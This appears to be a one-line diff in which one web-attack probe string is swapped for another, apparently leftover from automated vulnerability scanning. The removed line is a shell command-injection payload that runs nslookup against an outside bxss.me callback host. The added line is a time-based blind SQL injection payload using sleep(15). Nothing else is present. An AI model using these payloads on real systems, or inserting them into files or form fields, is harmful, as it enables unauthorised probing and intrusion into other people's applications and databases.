@@ -1,1 +1,1 @@
-&nslookup -q=cname hitpbnyhaxwdjbc6ea.bxss.me&'\"`0&nslookup -q=cname hitpbnyhaxwdjbc6ea.bxss.me&`'
+555*if(now()=sysdate(),sleep(15),0)
